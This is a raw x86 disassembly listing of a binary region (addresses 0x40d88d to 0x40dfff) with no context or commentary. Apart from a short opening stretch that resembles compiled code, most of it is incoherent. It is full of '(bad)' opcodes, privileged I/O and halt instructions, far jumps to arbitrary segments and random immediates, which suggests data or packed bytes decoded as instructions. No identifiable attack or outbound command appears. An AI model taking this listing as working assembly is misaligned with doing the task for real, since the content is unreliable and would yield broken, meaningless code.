  40d88d:	jmp    0x85da91
  40d892:	mov    edx,eax
  40d894:	test   al,0x1f
  40d896:	or     BYTE PTR [ebp+eax*2+0x10],al
  40d89a:	add    ecx,DWORD PTR [eax+ebx*1+0x14]
  40d89e:	inc    ebp
  40d89f:	(bad)  
  40d8a0:	mov    eax,DWORD PTR [eax+esi*8+0x33324d9e]
  40d8a7:	mov    DWORD PTR [ebx],eax
  40d8a9:	and    al,0xf
  40d8ab:	push   0xf84d85c1
  40d8b0:	mov    edi,ebp
  40d8b2:	rol    BYTE PTR [eax],1
  40d8b4:	iret   
  40d8b5:	or     DWORD PTR [ebx+esi*1+0x75329c9e],0x850f683b
  40d8c0:	push   edi
  40d8c1:	clc    
  40d8c2:	(bad)  
  40d8c3:	jmp    0x40d850
  40d8c5:	add    BYTE PTR [eax],dl
  40d8c7:	mov    eax,0xf8898545
  40d8cc:	jmp    0x40d89e
  40d8ce:	add    DWORD PTR [ebp+0x64009e],0x206544bf
  40d8d8:	pop    edi
  40d8d9:	inc    esp
  40d8da:	pop    ebx
  40d8db:	sbb    dl,al
  40d8dd:	inc    ebp
  40d8de:	add    BYTE PTR [ecx-0x747cdb75],cl
  40d8e4:	clc    
  40d8e5:	and    al,0xec
  40d8e7:	mov    DWORD PTR [ecx-0x7747adc],edi
  40d8ed:	and    al,0x4c
  40d8ef:	mov    DWORD PTR [eax],ecx
  40d8f1:	and    al,0x41
  40d8f3:	mov    ecx,DWORD PTR [ecx-0x7474dbdc]
  40d8f9:	and    al,0x24
  40d8fb:	xor    edx,DWORD PTR [esi+0x3]
  40d8fe:	push   edi
  40d8ff:	mov    DWORD PTR [ecx-0x75],edx
  40d902:	xor    esp,DWORD PTR [edi+edx*2]
  40d905:	mov    ebx,DWORD PTR [esi+0x3003294]
  40d90b:	mov    ecx,DWORD PTR [ecx-0x74dbdb75]
  40d911:	mov    ecx,DWORD PTR [esp+edx*4]
  40d914:	push   esp
  40d915:	add    BYTE PTR [eax],ah
  40d917:	mov    edx,DWORD PTR [ebp+0x3]
  40d91a:	cmp    edi,DWORD PTR [esi*2+0x24188b4c]
  40d921:	mov    DWORD PTR [ebx+0x33002401],ecx
  40d927:	dec    ecx
  40d928:	add    ebp,DWORD PTR [edx+0xf]
  40d92b:	push   0x4c30ca
  40d930:	adc    BYTE PTR [eax+0x1f],dh
  40d933:	push   0x0
  40d935:	(bad)  
  40d936:	cmp    ecx,DWORD PTR [ecx-0x7474db8b]
  40d93c:	and    al,0x24
  40d93e:	mov    esi,DWORD PTR [ebx]
  40d940:	and    al,0x3
  40d942:	xor    ecx,DWORD PTR [ecx-0x74f7db73]
  40d948:	jb     0x40d96e
  40d94a:	add    bh,bh
  40d94c:	inc    esp
  40d94d:	and    al,0x14
  40d94f:	lea    esi,[ebx]
  40d951:	and    al,0x9c
  40d953:	push   eax
  40d954:	jmp    0x54d99d
  40d959:	(bad)  
  40d95a:	cli    
  40d95b:	and    al,0x85
  40d95d:	(bad)  
  40d95e:	clc    
  40d95f:	and    al,0xa
  40d961:	call   0xffddd298
  40d966:	jmp    0x54d9af
  40d96b:	dec    esp
  40d96c:	aas    
  40d96d:	or     al,0x9c
  40d96f:	(bad)  
  40d970:	cmp    eax,edi
  40d972:	bswap  eax
  40d974:	mov    bh,0x4b
  40d976:	add    BYTE PTR [ebx+ecx*4+0x20],al
  40d97a:	and    al,0x4c
  40d97c:	mov    DWORD PTR [esp],ebx
  40d97f:	(bad)  
  40d980:	mov    eax,edi
  40d982:	or     BYTE PTR [edi-0x76e3dbbc],ch
  40d988:	inc    esp
  40d989:	jmp    0x40d99f
  40d98b:	add    DWORD PTR [edx+esi*1+0x20],0x1075449c
  40d993:	push   0xf8148544
  40d998:	inc    esp
  40d999:	sbb    BYTE PTR [edx+edi*8],dl
  40d99c:	dec    esp
  40d99d:	test   DWORD PTR [eax+edi*8],ebx
  40d9a0:	mov    BYTE PTR [edi],0xc7
  40d9a3:	xor    BYTE PTR [ecx],al
  40d9a5:	pushf  
  40d9a6:	inc    esp
  40d9a7:	jmp    0x40d9c1
  40d9a9:	add    DWORD PTR [eax+0x9c0130],0x44500875
  40d9b3:	jne    0x40d9cd
  40d9b5:	or     DWORD PTR [eax+0x100185],eax
  40d9bb:	or     al,0x0
  40d9bd:	jne    0x40da00
  40d9bf:	call   0xff65d84f
  40d9c4:	mov    eax,DWORD PTR [eax+ebx*8+0xc]
  40d9c8:	add    BYTE PTR [ebx+ecx*4+0xc],al
  40d9cc:	adc    al,0x5e
  40d9ce:	add    al,0xe5
  40d9d0:	add    dl,al
  40d9d2:	add    BYTE PTR [eax],al
  40d9d4:	inc    DWORD PTR [ecx]
  40d9d6:	push   eax
  40d9d7:	cli    
  40d9d8:	add    al,bh
  40d9da:	shl    DWORD PTR [ecx],1
  40d9dc:	inc    esp
  40d9dd:	jmp    0x40d9eb
  40d9df:	xor    DWORD PTR [ebp+esi*2+0x14],eax
  40d9e3:	test   esi,eax
  40d9e5:	cli    
  40d9e6:	(bad)  
  40d9e7:	inc    DWORD PTR [eax+ecx*1+0x24]
  40d9eb:	inc    DWORD PTR [esp+0x1c]
  40d9ef:	and    al,0x74
  40d9f1:	mov    ebx,DWORD PTR [eax]
  40d9f3:	or     al,0x44
  40d9f5:	and    al,0x28
  40d9f7:	and    al,0x8d
  40d9f9:	add    esp,DWORD PTR [esp+esi*2]
  40d9fc:	push   eax
  40d9fd:	and    al,0x74
  40d9ff:	and    al,0x2c
  40da01:	add    esi,DWORD PTR [esp+eax*2+0x24]
  40da05:	ss mov bl,0x7
  40da08:	inc    DWORD PTR [ecx-0x7749775]
  40da0e:	xor    edi,DWORD PTR [esi+0x3b]
  40da11:	mov    ecx,DWORD PTR [ebx+0xf338b5d]
  40da17:	and    al,0x85
  40da19:	pushf  
  40da1a:	pushf  
  40da1b:	clc    
  40da1c:	dec    DWORD PTR [ecx+0x41073f5f]
  40da22:	add    BYTE PTR [ebx+0x7],al
  40da25:	inc    ecx
  40da26:	add    BYTE PTR [edi+0x7],al
  40da29:	inc    ecx
  40da2a:	add    BYTE PTR [ebx+0x7],cl
  40da2d:	inc    ecx
  40da2e:	add    BYTE PTR [edi+0x7],cl
  40da31:	inc    ecx
  40da32:	add    BYTE PTR [ebx+0x7],dl
  40da35:	inc    ecx
  40da36:	add    BYTE PTR [edi+0x7],dl
  40da39:	inc    ecx
  40da3a:	add    BYTE PTR [ebx+0x7],bl
  40da3d:	inc    ecx
  40da3e:	add    ah,dl
  40da40:	(bad)  
  40da41:	in     eax,dx
  40da42:	jp     0x40da33
  40da44:	jp     0x40da1d
  40da46:	(bad)  
  40da47:	jnp    0x40da85
  40da49:	adc    ecx,DWORD PTR [esi+0x63]
  40da4c:	not    DWORD PTR [esi]
  40da4e:	inc    edx
  40da4f:	and    ecx,0x7220000
  40da55:	add    BYTE PTR [eax],al
  40da57:	sbb    ebx,DWORD PTR [edi+0x21]
  40da5a:	push   es
  40da5b:	push   cs
  40da5c:	fsub   DWORD PTR [esi+0x50399c5a]
  40da62:	inc    ebp
  40da63:	pop    ds
  40da64:	rcl    DWORD PTR [ecx],cl
  40da66:	push   edx
  40da67:	cmp    al,BYTE PTR [esi+eax*8-0x77]
  40da6b:	imul   DWORD PTR [edi+0x6691a13d]
  40da71:	cld    
  40da72:	mov    WORD PTR [edi-0x59ff1e9d],gs
  40da78:	pop    ss
  40da79:	es add eax,0xf6933c37
  40da7f:	inc    ebx
  40da80:	sahf   
  40da81:	jnp    0x40da1b
  40da83:	das    
  40da84:	ret    
  40da85:	xor    eax,0x84395f55
  40da8a:	jns    0x40da7d
  40da8c:	mov    eax,0xfa56a1c
  40da91:	loope  0x40db05
  40da93:	ret    
  40da94:	adc    dh,BYTE PTR [edx-0x660011a1]
  40da9a:	in     eax,dx
  40da9b:	hlt    
  40da9c:	push   es
  40da9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da9e:	fsubr  QWORD PTR [esi-0x55]
  40daa1:	into   
  40daa2:	fld    QWORD PTR [edx]
  40daa4:	imul   eax,DWORD PTR [ebp-0x3a],0xf415e710
  40daab:	cdq    
  40daac:	data16 mov dh,0x5
  40daaf:	xchg   ebp,eax
  40dab0:	adc    al,0xaa
  40dab2:	(bad)  
  40dab4:	mov    bl,0xda
  40dab6:	dec    ecx
  40dab7:	mov    ebp,esp
  40dab9:	pop    edx
  40daba:	aaa    
  40dabb:	jmp    0x40da5b
  40dabd:	jns    0x40dac5
  40dabf:	inc    esi
  40dac0:	inc    eax
  40dac1:	(bad)
  40dac4:	loopne 0x40dadc
  40dac6:	dec    ebp
  40dac7:	mov    ah,0x99
  40dac9:	fbstp  TBYTE PTR [ebx-0x50]
  40dacc:	mov    ch,0x68
  40dace:	adc    eax,0xc7cfbc7f
  40dad3:	add    DWORD PTR [esi],ecx
  40dad5:	out    0x9,al
  40dad7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dad8:	or     DWORD PTR [eax-0x3465c773],eax
  40dade:	pop    ebx
  40dadf:	fwait
  40dae0:	sahf   
  40dae1:	out    dx,eax
  40dae2:	imul   ebp,edx
  40dae5:	(bad)  
  40dae6:	test   al,0x2e
  40dae8:	push   eax
  40dae9:	sbb    eax,0xaea12862
  40daee:	aas    
  40daef:	in     eax,dx
  40daf0:	jns    0x40db31
  40daf2:	push   ds
  40daf3:	adc    ebp,DWORD PTR [esi+0x40772b94]
  40daf9:	mov    es,WORD PTR [ebp-0x5c]
  40dafc:	mov    ds:0x2d7dabd3,eax
  40db01:	mov    edx,0xb4c94214
  40db06:	lods   eax,DWORD PTR ds:[esi]
  40db07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db08:	mov    edx,0xae5e2189
  40db0d:	push   eax
  40db0e:	or     BYTE PTR [ebx-0x34],dh
  40db11:	adc    al,0x4f
  40db13:	sahf   
  40db14:	stos   DWORD PTR es:[edi],eax
  40db15:	mov    esp,0x27716a5c
  40db1a:	ror    DWORD PTR [ecx-0x50],0xd2
  40db1e:	(bad)
  40db21:	hlt    
  40db22:	push   ecx
  40db23:	mov    al,ds:0x7e6f767a
  40db28:	cmp    eax,0x475d33a5
  40db2d:	ja     0x40db99
  40db2f:	lea    ebp,[ebx-0x782f10cf]
  40db35:	or     eax,0xbed43a3a
  40db3a:	sub    eax,0x9ba853b4
  40db3f:	std    
  40db40:	cmc    
  40db41:	xor    esp,DWORD PTR [edi]
  40db43:	push   es
  40db44:	mov    cl,0xd9
  40db46:	das    
  40db47:	es xchg ecx,eax
  40db49:	adc    BYTE PTR [edx+0x21c80409],cl
  40db4f:	mov    al,ds:0xc82908df
  40db54:	rcl    DWORD PTR [ebx-0x371e3406],0xf5
  40db5b:	fcomp  QWORD PTR ds:0xa298ca37
  40db61:	xchg   esp,eax
  40db62:	fdiv   st(2),st
  40db64:	nop
  40db65:	cmp    esi,ebx
  40db67:	imul   esp,DWORD PTR [edi+0x4f750f45],0xf7eb6108
  40db71:	xor    BYTE PTR [ebp+0x44],bl
  40db74:	(bad)  
  40db75:	dec    esp
  40db76:	jne    0x40dbf7
  40db78:	(bad)  
  40db79:	sub    eax,0x9fefea9a
  40db7e:	and    esi,DWORD PTR [edi+edi*2+0x26]
  40db82:	adc    DWORD PTR [bx+si],esi
  40db85:	xor    esi,edx
  40db87:	mov    ebp,0x8ad8d8f9
  40db8c:	dec    ebx
  40db8d:	inc    esi
  40db8e:	sahf   
  40db8f:	push   ecx
  40db90:	ss mov al,0xc5
  40db93:	fwait
  40db94:	bnd ret 
  40db96:	jne    0x40dba0
  40db98:	dec    ecx
  40db99:	push   eax
  40db9a:	mov    al,ds:0xe14f0347
  40db9f:	and    al,0x71
  40dba1:	inc    edi
  40dba2:	ret    
  40dba3:	scas   al,BYTE PTR es:[edi]
  40dba4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dba5:	(bad)  
  40dba6:	cmp    ah,BYTE PTR [eax+0x7da9e437]
  40dbac:	rol    BYTE PTR [edx+0x73],0x83
  40dbb0:	and    al,0x6
  40dbb2:	imul   esi,DWORD PTR [edx+edi*8-0x496c1f91],0xffffffa0
  40dbba:	pop    esp
  40dbbb:	addr16 pop eax
  40dbbd:	cld    
  40dbbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbbf:	xor    eax,0x44469a52
  40dbc4:	data16 push cx
  40dbc7:	lahf   
  40dbc8:	jge    0x40db85
  40dbca:	sub    al,0x34
  40dbcc:	pop    edi
  40dbcd:	push   ds
  40dbce:	ror    DWORD PTR [edi],0x2d
  40dbd1:	bound  edi,QWORD PTR [esi-0x1d0e7a6b]
  40dbd7:	inc    edx
  40dbd8:	or     al,0x4b
  40dbda:	and    eax,0xe75d40f7
  40dbdf:	das    
  40dbe0:	inc    eax
  40dbe1:	lock in al,0x2a
  40dbe4:	xor    eax,0xcb8a00b9
  40dbe9:	int    0x69
  40dbeb:	or     bh,BYTE PTR [ebx+0x21de79a7]
  40dbf1:	mov    dl,0xa7
  40dbf3:	mov    ah,0xa
  40dbf5:	pusha  
  40dbf6:	mov    ds:0x62ad4559,eax
  40dbfb:	popf   
  40dbfc:	mov    eax,ds:0x45f3ef2f
  40dc01:	mov    ecx,0x3ac4b0c9
  40dc06:	fwait
  40dc07:	lea    esi,[edi+0x6ebea08f]
  40dc0d:	add    al,0x3b
  40dc0f:	and    esp,DWORD PTR [ebp-0x69]
  40dc12:	add    esi,ebx
  40dc14:	dec    ebx
  40dc15:	sub    BYTE PTR [edi+0x69],dl
  40dc18:	je     0x40dc7e
  40dc1a:	ds scas al,BYTE PTR es:[edi]
  40dc1c:	fnstsw WORD PTR [ebx+edi*8]
  40dc1f:	sbb    esi,DWORD PTR [esi-0x3b4d41ec]
  40dc25:	stos   BYTE PTR es:[edi],al
  40dc26:	cdq    
  40dc27:	adc    ch,BYTE PTR [eax+eax*8+0x2e]
  40dc2b:	loopne 0x40dc84
  40dc2d:	(bad)  
  40dc2e:	pop    edx
  40dc2f:	add    DWORD PTR [ebx-0x681b2a35],0xf7d6d996
  40dc39:	js     0x40dbd6
  40dc3b:	pop    edx
  40dc3c:	stos   BYTE PTR es:[edi],al
  40dc3d:	popa   
  40dc3e:	aaa    
  40dc3f:	add    ecx,DWORD PTR [edx]
  40dc41:	ins    DWORD PTR es:[edi],dx
  40dc42:	sub    BYTE PTR [edx],0x54
  40dc45:	jmp    0x6c0e:0xf8f3a085
  40dc4c:	ret    
  40dc4d:	push   ebx
  40dc4e:	cmp    eax,0x7c870270
  40dc53:	pusha  
  40dc54:	pusha  
  40dc55:	pop    ss
  40dc56:	push   esp
  40dc57:	inc    ebx
  40dc58:	mov    ebp,0x85f8f3db
  40dc5d:	ins    BYTE PTR es:[edi],dx
  40dc5e:	add    al,0x32
  40dc60:	stos   BYTE PTR es:[edi],al
  40dc61:	int3   
  40dc62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc63:	lds    eax,FWORD PTR [esi-0x46]
  40dc66:	jnp    0x40dcd2
  40dc68:	pop    eax
  40dc69:	test   BYTE PTR [esi-0x55],bh
  40dc6c:	inc    ebx
  40dc6d:	mov    DWORD PTR [eax-0x40f76e4d],0xdd466a81
  40dc77:	hlt    
  40dc78:	pop    esp
  40dc79:	inc    BYTE PTR [ebx+0x23c058d2]
  40dc7f:	pop    edi
  40dc80:	mov    bl,0x15
  40dc82:	loope  0x40dcb0
  40dc84:	sub    eax,DWORD PTR [esi+eax*4-0x72]
  40dc88:	nop
  40dc89:	int3   
  40dc8a:	loop   0x40dcff
  40dc8c:	(bad)  
  40dc8d:	mov    eax,ds:0x15db1a64
  40dc92:	les    ecx,FWORD PTR [edi]
  40dc94:	add    al,0xfa
  40dc96:	out    dx,al
  40dc97:	(bad)  
  40dc98:	stos   DWORD PTR es:[edi],eax
  40dc99:	inc    esp
  40dc9a:	sub    eax,0x6b73532f
  40dc9f:	xor    ebx,DWORD PTR ds:0x58de925
  40dca5:	hlt    
  40dca6:	sahf   
  40dca7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dca8:	mov    BYTE PTR [esi+0x1b],ah
  40dcab:	jg     0x40dd23
  40dcad:	and    DWORD PTR [eax+0x6c],ebx
  40dcb0:	mov    edi,DWORD PTR [esi+0x4b]
  40dcb3:	jb     0x40dcfc
  40dcb5:	test   BYTE PTR [edx],bh
  40dcb7:	jge    0x40dd2c
  40dcb9:	les    ebp,FWORD PTR [ebx+0x25]
  40dcbc:	inc    ebx
  40dcbd:	repnz push ds
  40dcbf:	aam    0x68
  40dcc1:	fiadd  WORD PTR [eax]
  40dcc3:	jne    0x40dd1f
  40dcc5:	mov    ebx,0x6152402c
  40dcca:	mov    BYTE PTR ds:0xab4081e1,dh
  40dcd0:	inc    esi
  40dcd1:	lds    ebp,FWORD PTR [ebx+ecx*8-0x70]
  40dcd5:	gs cmc 
  40dcd7:	add    DWORD PTR [edi-0x1a],ecx
  40dcda:	sub    DWORD PTR [ebx],edx
  40dcdc:	xchg   ebx,eax
  40dcdd:	aas    
  40dcde:	rol    DWORD PTR [esi],cl
  40dce0:	out    dx,eax
  40dce1:	out    dx,eax
  40dce2:	mov    eax,ds:0xdc47eaad
  40dce7:	xor    BYTE PTR [esi-0xaaf8934],0xb7
  40dcee:	leave  
  40dcef:	sub    BYTE PTR [edx],al
  40dcf1:	pop    ebp
  40dcf2:	ret    0x18a6
  40dcf5:	(bad)  
  40dcf6:	shl    edx,1
  40dcf8:	cmp    al,0xcf
  40dcfa:	mov    edi,0x22b5bb89
  40dcff:	fiadd  DWORD PTR [edi+0x2972f2e6]
  40dd05:	call   0xba2:0x230827a5
  40dd0c:	daa    
  40dd0d:	fistp  DWORD PTR [edi]
  40dd0f:	dec    esi
  40dd10:	adc    eax,0xf4c086d0
  40dd15:	test   BYTE PTR [edi+0x6c],ch
  40dd18:	sbb    al,BYTE PTR [esi]
  40dd1a:	gs pop ebx
  40dd1c:	(bad)  [ebx+0x5ef255f2]
  40dd22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd23:	shr    DWORD PTR [ebx],1
  40dd25:	and    esp,0x537eca53
  40dd2b:	cmp    eax,0x4b09df2e
  40dd30:	imul   esi,DWORD PTR [edx+0x30],0x36ceb4a1
  40dd37:	jp     0x40dd41
  40dd39:	sbb    DWORD PTR [ecx+0x3c],0x6b7a9ba6
  40dd40:	xchg   BYTE PTR [eax-0x11],ch
  40dd43:	shr    DWORD PTR [eax+ebx*2-0x283056d4],0x4f
  40dd4b:	xchg   ecx,eax
  40dd4c:	pop    ebp
  40dd4d:	popf   
  40dd4e:	dec    eax
  40dd4f:	stos   BYTE PTR es:[edi],al
  40dd50:	adc    al,0xf
  40dd52:	push   esp
  40dd53:	sbb    BYTE PTR [edx],bl
  40dd55:	test   BYTE PTR [edi+edx*8],ch
  40dd58:	push   eax
  40dd59:	ins    BYTE PTR es:[edi],dx
  40dd5a:	adc    al,BYTE PTR [eax]
  40dd5c:	push   cs
  40dd5d:	adc    edx,ecx
  40dd5f:	add    eax,esp
  40dd61:	push   0x2a
  40dd63:	xchg   esi,eax
  40dd64:	cmp    eax,0x177dd6c5
  40dd69:	jns    0x40ddd4
  40dd6b:	(bad)  
  40dd6c:	cmp    dl,BYTE PTR ds:0x2ff0dd0d
  40dd72:	test   BYTE PTR [esi+0x77],ah
  40dd75:	pop    edx
  40dd76:	mov    ds:0xc5989952,eax
  40dd7b:	enter  0xf254,0xc8
  40dd7f:	pushf  
  40dd80:	shl    DWORD PTR [edi],0x5a
  40dd83:	popa   
  40dd84:	aam    0x79
  40dd86:	sbb    bh,bh
  40dd88:	inc    ebx
  40dd89:	mov    cl,0xa9
  40dd8b:	int    0xf
  40dd8d:	aaa    
  40dd8e:	jns    0x40dd10
  40dd90:	inc    edx
  40dd91:	imul   ebp,ebx,0x4d
  40dd94:	cmp    DWORD PTR ds:0x13e506fd,eax
  40dd9a:	sub    dl,BYTE PTR [ecx+0x5c]
  40dd9d:	inc    ecx
  40dd9e:	pop    edi
  40dd9f:	scas   al,BYTE PTR es:[edi]
  40dda0:	jg     0x40dd50
  40dda2:	push   0xd1f85f2
  40dda7:	(bad)
  40ddaa:	xchg   ebx,eax
  40ddab:	in     eax,dx
  40ddac:	jns    0x40ddd0
  40ddae:	xchg   edi,eax
  40ddaf:	and    BYTE PTR [esi-0x1398b996],al
  40ddb5:	or     al,0x4e
  40ddb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddb8:	or     bl,BYTE PTR [ebx]
  40ddba:	out    0x0,al
  40ddbc:	pop    ebp
  40ddbd:	popa   
  40ddbe:	loope  0x40ddb1
  40ddc0:	iret   
  40ddc1:	repz or cl,BYTE PTR [esi-0x4e8abcf1]
  40ddc8:	jmp    0x311:0xe41332d4
  40ddcf:	xlat   BYTE PTR ds:[ebx]
  40ddd0:	stos   BYTE PTR es:[edi],al
  40ddd1:	jmp    0xdf281387
  40ddd6:	inc    esi
  40ddd7:	add    ch,BYTE PTR [esi]
  40ddd9:	dec    ecx
  40ddda:	les    ecx,FWORD PTR [edx+0x7a758ff3]
  40dde0:	sar    ah,0x49
  40dde3:	push   eax
  40dde4:	sbb    DWORD PTR [ebx],esp
  40dde6:	mov    esi,ecx
  40dde8:	push   ecx
  40dde9:	in     al,dx
  40ddea:	sbb    DWORD PTR [eax-0x34],edx
  40dded:	icebp  
  40ddee:	xor    al,0x79
  40ddf0:	call   0x866b:0x8e4e7b4f
  40ddf7:	(bad)  
  40ddf8:	xlat   BYTE PTR ds:[ebx]
  40ddf9:	outs   dx,BYTE PTR ds:[esi]
  40ddfa:	bound  esi,QWORD PTR [edi-0xf]
  40ddfd:	scas   al,BYTE PTR es:[edi]
  40ddfe:	stc    
  40ddff:	mov    eax,0x74ed62bf
  40de04:	dec    eax
  40de05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de06:	sahf   
  40de07:	clc    
  40de08:	pushf  
  40de09:	push   ss
  40de0a:	jge    0x40dddd
  40de0c:	inc    edi
  40de0d:	test   ch,cl
  40de0f:	add    BYTE PTR [edi-0x1e543d97],dh
  40de15:	out    dx,eax
  40de16:	imul   edi,DWORD PTR [ecx-0x45],0x6477cfd
  40de1d:	inc    edi
  40de1e:	push   0x2c5013d1
  40de23:	mov    fs:0x11608227,eax
  40de29:	and    eax,0x4ca1a6f8
  40de2e:	aam    0x2c
  40de30:	push   ebx
  40de31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de32:	sub    edx,eax
  40de34:	les    ebp,FWORD PTR [edx+ecx*2+0x20]
  40de38:	push   esi
  40de39:	or     DWORD PTR [ecx],0x6bc90a53
  40de3f:	ret    0x8d3a
  40de42:	push   ds
  40de43:	xchg   ecx,eax
  40de44:	inc    edi
  40de45:	mov    esi,0xeabea0d2
  40de4a:	in     eax,0x96
  40de4c:	rol    al,1
  40de4e:	add    ebp,DWORD PTR [ebp-0x1d]
  40de51:	sub    eax,edi
  40de53:	(bad)  
  40de54:	call   0x43b5f8ba
  40de59:	xchg   esi,eax
  40de5a:	imul   ebp,DWORD PTR [ecx+0x3e],0x87e64314
  40de61:	mov    bh,0xa9
  40de63:	dec    edi
  40de64:	nop
  40de65:	aas    
  40de66:	inc    ebp
  40de67:	scas   eax,DWORD PTR es:[edi]
  40de68:	push   ebp
  40de69:	fisttp QWORD PTR ds:0xfe88a909
  40de6f:	out    dx,al
  40de70:	int3   
  40de71:	or     al,0xa5
  40de73:	daa    
  40de74:	inc    edi
  40de75:	add    al,0xeb
  40de77:	and    al,0x67
  40de79:	fisttp QWORD PTR [edx]
  40de7b:	jne    0x40de7b
  40de7d:	pop    ebx
  40de7e:	dec    ecx
  40de7f:	popf   
  40de80:	or     BYTE PTR [edx-0x7d],bl
  40de83:	dec    edx
  40de84:	(bad)  
  40de85:	in     eax,dx
  40de86:	int    0xb6
  40de88:	(bad)
  40de8c:	xchg   ecx,eax
  40de8d:	loopne 0x40de55
  40de8f:	enter  0x5f52,0xc8
  40de93:	outs   dx,DWORD PTR ds:[esi]
  40de94:	xchg   ebp,eax
  40de95:	jb     0x40de3b
  40de97:	ret    
  40de98:	jl     0x40de91
  40de9a:	xchg   esi,eax
  40de9b:	loopne 0x40de78
  40de9d:	and    ah,BYTE PTR [ebx-0x41075316]
  40dea3:	not    DWORD PTR [eax-0x14]
  40dea6:	inc    esi
  40dea7:	xchg   ecx,eax
  40dea8:	int    0x3
  40deaa:	mov    edi,0xf15d1d05
  40deaf:	loope  0x40df10
  40deb1:	xor    DWORD PTR [edx],edi
  40deb3:	push   ds
  40deb4:	inc    edi
  40deb5:	out    0x6d,al
  40deb7:	mov    eax,0x1eba50bf
  40debc:	inc    esi
  40debd:	and    edi,DWORD PTR [ebp+0x6cdd097e]
  40dec3:	outs   dx,BYTE PTR ds:[esi]
  40dec4:	mov    ch,0x3b
  40dec6:	mov    ebx,0xf7c3adff
  40decb:	mov    ecx,0xacdeb2cd
  40ded0:	mov    eax,ds:0x55dd38c6
  40ded5:	lds    edi,FWORD PTR [edx+0x15]
  40ded8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ded9:	iret   
  40deda:	test   eax,0xce937069
  40dedf:	out    0x62,al
  40dee1:	push   edx
  40dee2:	sbb    BYTE PTR [ecx],bl
  40dee4:	adc    al,0xe4
  40dee6:	das    
  40dee7:	or     al,0x3a
  40dee9:	arpl   WORD PTR [ebx+0x69533532],bx
  40deef:	mov    ds:0xd1246f9c,al
  40def4:	push   ss
  40def5:	or     ebp,ebp
  40def7:	xor    al,0x23
  40def9:	sub    BYTE PTR [esp+esi*4+0x75],ah
  40defd:	jmp    0x40deeb
  40deff:	jnp    0x40de83
  40df01:	inc    esi
  40df02:	mov    edi,0x827699b0
  40df07:	xchg   edx,eax
  40df08:	cmp    bh,BYTE PTR [esi-0x3e]
  40df0b:	mov    BYTE PTR [ecx+0x93c34a6],ch
  40df11:	pop    esp
  40df12:	dec    eax
  40df13:	xor    BYTE PTR [eax+ebx*4],0x5a
  40df17:	push   esi
  40df18:	xchg   ebp,eax
  40df19:	mov    ?,esp
  40df1b:	pop    ss
  40df1c:	sub    BYTE PTR [edi-0x7e],cl
  40df1f:	pushf  
  40df20:	cmp    edx,DWORD PTR [edi+edx*8]
  40df23:	rol    BYTE PTR [ebx-0x5b],0x60
  40df27:	or     ah,BYTE PTR [eax+0x42]
  40df2a:	add    esi,ebx
  40df2c:	xor    dl,BYTE PTR [esi+0x27e8717b]
  40df32:	fsub   QWORD PTR [edx-0x48]
  40df35:	int    0x6
  40df37:	scas   al,BYTE PTR es:[edi]
  40df38:	push   esp
  40df39:	or     esi,ecx
  40df3b:	dec    esp
  40df3c:	imul   eax,DWORD PTR [ebx],0x55c395a6
  40df42:	or     esp,ebp
  40df44:	stc    
  40df45:	icebp  
  40df46:	ins    DWORD PTR es:[edi],dx
  40df47:	data16 mov ah,0x93
  40df4a:	or     DWORD PTR gs:[eax+0x47],ecx
  40df4e:	nop
  40df4f:	push   0x858e135d
  40df54:	sar    BYTE PTR [edi-0x1],0xb6
  40df58:	gs in  al,dx
  40df5a:	mov    dh,0xa7
  40df5c:	mov    al,ah
  40df5e:	sub    ebp,DWORD PTR [ecx]
  40df60:	pushf  
  40df61:	adc    eax,ebp
  40df63:	push   0x2
  40df65:	btr    DWORD PTR [ecx+ebx*2-0x49],0xd6
  40df6b:	jbe    0x40df09
  40df6d:	(bad)  
  40df6e:	push   0x22
  40df70:	aam    0x5d
  40df72:	mov    esp,edx
  40df74:	in     eax,dx
  40df75:	cwde   
  40df76:	and    al,BYTE PTR [ebx-0x60]
  40df79:	xchg   edi,eax
  40df7a:	adc    bl,BYTE PTR [ecx-0xa]
  40df7d:	jge    0x40dfcf
  40df7f:	iret   
  40df80:	outs   dx,DWORD PTR ds:[esi]
  40df81:	icebp  
  40df82:	xor    al,0x3d
  40df84:	cmp    dh,BYTE PTR [esi]
  40df86:	mov    cl,0x88
  40df88:	jb     0x40df28
  40df8a:	push   ds
  40df8b:	scas   eax,DWORD PTR es:[edi]
  40df8c:	fstp   DWORD PTR [eax]
  40df8e:	add    DWORD PTR [ecx-0x6b9f9644],edi
  40df94:	or     dh,BYTE PTR [edx+0x67]
  40df97:	mov    al,0x77
  40df99:	mov    esp,0xcb6550e6
  40df9e:	imul   DWORD PTR [ecx+eax*2]
  40dfa1:	ror    DWORD PTR [eax+eax*8+0xf],0x48
  40dfa6:	mov    esi,0x3b07197e
  40dfab:	loop   0x40df3f
  40dfad:	hlt    
  40dfae:	clc    
  40dfaf:	add    BYTE PTR [edx+eax*8-0x2b],ah
  40dfb3:	jbe    0xe51bac7c
  40dfb9:	inc    ebx
  40dfba:	cmp    esi,DWORD PTR [edi-0x18]
  40dfbd:	cs push edx
  40dfbf:	jmp    0xaa048293
  40dfc4:	jp     0x40df78
  40dfc6:	pop    edi
  40dfc7:	stc    
  40dfc8:	push   esi
  40dfc9:	xor    al,0xba
  40dfcb:	jmp    0xf8ffe84
  40dfd0:	add    eax,0x9ca37fb7
  40dfd5:	addr16 and al,0x4a
  40dfd8:	xchg   esi,eax
  40dfd9:	repz in al,0x4
  40dfdc:	jge    0x40dfe0
  40dfde:	push   cs
  40dfdf:	and    eax,0xc52a469f
  40dfe4:	pop    edx
  40dfe5:	cmp    BYTE PTR [esi],0x3f
  40dfe8:	mov    al,ds:0x7bbf039
  40dfed:	mov    esp,0x3b829a34
  40dff2:	mov    ebp,0xffc2da1
  40dff7:	sbb    esp,DWORD PTR [eax-0x29497aef]
  40dffd:	shl    BYTE PTR [ebx],cl
  40dfff:	mov    dl,0xc7
